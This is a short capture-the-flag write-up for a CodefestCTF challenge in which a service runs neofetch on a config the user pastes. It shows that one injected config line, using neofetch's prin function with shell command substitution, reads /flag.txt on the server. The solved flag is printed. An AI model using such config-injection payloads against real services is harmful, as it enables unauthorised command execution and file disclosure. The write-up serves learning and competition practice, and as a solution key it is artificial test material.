# Fetch

Total Solves - 104

Final Points - 100

## Description
Are you a unixporn enthusiast? Well, I made just the thing for you!

## Writeup
First thing you can see is that on entering nothing, default neofetch output is printed.

```

    ███████╗███████╗████████╗ ██████╗██╗  ██╗
    ██╔════╝██╔════╝╚══██╔══╝██╔════╝██║  ██║
    █████╗  █████╗     ██║   ██║     ███████║
    ██╔══╝  ██╔══╝     ██║   ██║     ██╔══██║
    ██║     ███████╗   ██║   ╚██████╗██║  ██║
    ╚═╝     ╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝

    A config checker for neofetch

    
Paste your neofetch config. Don't use empty lines.

neofetch output:

       _,met$$$$$gg.          root@840f1a453cad 
    ,g$$$$$$$$$$$$$$$P.       ----------------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 12 (bookworm) x86_64 
 ,$$P'              `$$$.     Host: Google Compute Engine 
',$$P       ,ggs.     `$$b:   Kernel: 6.8.0-1020-gcp 
`d$$'     ,$P"'   .    $$$    Uptime: 1 day, 20 hours, 24 mins 
 $$P      d$'     ,    $$P    Packages: 257 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.2.15 
 $$;      Y$b._   _,d$P'      Terminal: socat 
 Y$$.    `.`"Y$$$$P"'         CPU: Intel Xeon (8) @ 2.199GHz 
 `$$b      "-.__              Memory: 2211MiB / 32093MiB 
  `Y$$
   `Y$$.                                              
     `$$b.                                            
       `Y$$b.
          `"Y$b._
              `"""

```
If you go to [neofetch wiki](https://github.com/dylanaraps/neofetch/wiki/Customizing-Info) and read about the configuration, you will come across `prin` function that you can use to run custom commands.

```
    ███████╗███████╗████████╗ ██████╗██╗  ██╗
    ██╔════╝██╔════╝╚══██╔══╝██╔════╝██║  ██║
    █████╗  █████╗     ██║   ██║     ███████║
    ██╔══╝  ██╔══╝     ██║   ██║     ██╔══██║
    ██║     ███████╗   ██║   ╚██████╗██║  ██║
    ╚═╝     ╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝

    A config checker for neofetch

    
Paste your neofetch config. Don't use empty lines.
prin "FLAG" "$(cat /flag.txt)"

neofetch output:

onFLAG: CodefestCTF{7h15_15_7h3_n30f37ch_f14g_dGhJqHC1} 
       _,met$$$$$gg.          root@840f1a453cad 
    ,g$$$$$$$$$$$$$$$P.       ----------------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 12 (bookworm) x86_64 
 ,$$P'              `$$$.     Host: Google Compute Engine 
',$$P       ,ggs.     `$$b:   Kernel: 6.8.0-1020-gcp 
`d$$'     ,$P"'   .    $$$    Uptime: 1 day, 20 hours, 27 mins 
 $$P      d$'     ,    $$P    Packages: 257 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.2.15 
 $$;      Y$b._   _,d$P'      Terminal: socat 
 Y$$.    `.`"Y$$$$P"'         CPU: Intel Xeon (8) @ 2.199GHz 
 `$$b      "-.__              Memory: 2205MiB / 32093MiB 
  `Y$$
   `Y$$.                                              
     `$$b.                                            
       `Y$$b.
          `"Y$b._
              `"""
```

## Flag
`CodefestCTF{7h15_15_7h3_n30f37ch_f14g_[a-zA-Z0-9]{8}}`